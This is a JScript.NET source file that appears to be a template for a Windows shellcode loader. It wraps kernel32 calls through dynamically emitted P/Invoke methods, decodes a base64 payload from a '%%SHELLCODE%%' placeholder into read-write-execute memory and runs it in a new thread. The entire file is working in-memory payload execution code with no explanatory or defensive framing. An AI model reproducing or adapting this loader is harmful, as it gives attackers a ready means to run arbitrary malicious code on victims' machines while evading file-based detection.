import System;
import System.Runtime.InteropServices;
import System.Reflection;
import System.Reflection.Emit;
import System.Runtime;
import System.Text;
function InvokeWin32(dllName:String, returnType:Type, methodName:String, parameterTypes:Type[], parameters:Object[])
{
  var domain = AppDomain.CurrentDomain;
  var name = new System.Reflection.AssemblyName('PInvokeAssembly');
  var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
  var module = assembly.DefineDynamicModule('PInvokeModule');
  var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit);
  var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);
  var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType("System.String")]);
  var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
  method.SetCustomAttribute(attr);
  var realType = type.CreateType();
  return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
}
 
function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "VirtualAlloc", parameterTypes,  parameters );
}
function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.IntPtr"),Type.GetType("System.IntPtr"), Type.GetType("System.UInt32"), Type.GetType("System.UInt32") ];
	var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "CreateThread", parameterTypes,  parameters );
}
function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.IntPtr"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [handle, dwMiliseconds ];
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "WaitForSingleObject", parameterTypes,  parameters );
}

function ShellCodeExec()
{
	var MEM_COMMIT:uint = 0x1000;
	var PAGE_EXECUTE_READWRITE:uint = 0x40;
	var shellcodestr:String = '%%SHELLCODE%%';	
	var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
	var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
	var hThread:IntPtr = IntPtr.Zero;
	var threadId:UInt32 = 0;
	var pinfo:IntPtr = IntPtr.Zero;
	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
	WaitForSingleObject(hThread, 0xFFFFFFFF);
}
ShellCodeExec();